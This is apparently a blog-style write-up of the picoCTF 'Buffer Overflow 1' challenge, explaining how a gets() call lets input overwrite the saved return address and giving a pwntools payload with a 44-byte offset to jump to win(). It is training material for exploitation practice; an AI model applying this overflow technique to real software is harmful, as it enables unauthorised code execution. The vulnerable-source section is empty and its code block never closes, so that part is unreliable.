---
title: "picoCTF: Buffer Overflow 1"
date: 2026-03-03
tags:
  - CTF
  - Pwn
  - Buffer Overflow
  - x86
summary: "Exploit a classic stack buffer overflow by overwriting the saved return address to redirect execution to win()."
github: "https://github.com/tyler-rivers23/nextcloud-docker-setup" # optional; remove if not relevant
ctf: "Pico Buffer Overflow1"
source: "/writeups/bof1/vuln.c"
asm: "/writeups/bof1/vuln.asm"
---

## TL;DR
- Bug: `gets(buf)` allows writing past the buffer
- Goal: overwrite saved return address → jump to `win()`
- Offset: **44 bytes**
- Payload: `b"A"*44 + p32(win_addr)`

---

## Challenge Overview
This binary reads a string and eventually returns from `vuln()`. If we overwrite the saved return address on the stack, we can redirect execution to `win()` (which prints the flag).  
(Your original writeup explains this well; we’re just presenting it in a cleaner way.)  

---
## Vulnerable Source Code
```terminal
$ cat vuln.c

## Recon
### Run the service

nc <host> <port>
--- 
## Vulnerability

In the source, the bug is inside vuln():

gets(buf);

---
gets() does not enforce bounds → input can overflow past buf and overwrite stack values (including the saved return address).

Find the win() Address

Use Ghidra (or nm, objdump) to locate win():

nm -n vuln | grep " win"
# or
objdump -d vuln | grep "<win>"

Record the entry address for win().

Offset to Return Address

We need the number of bytes from the start of the buffer to the saved return address.

From debugging / analysis, the offset is:

44 bytes

[ buffer (44 bytes) ][ saved EIP ]

Exploit Payload

Because x86 is little-endian, the win() address must be written least-significant byte first.

Python concept:

from pwn import p32

offset = 44
win_addr = 0xDEADBEEF  # replace with actual

payload = b"A" * offset + p32(win_addr)
print(payload)

Send it to the service:

python3 exploit.py | nc <host> <port>

Result

Once the saved return address is overwritten with win(), when vuln() returns, execution jumps into win() and prints the flag.

✅ Flag obtained.


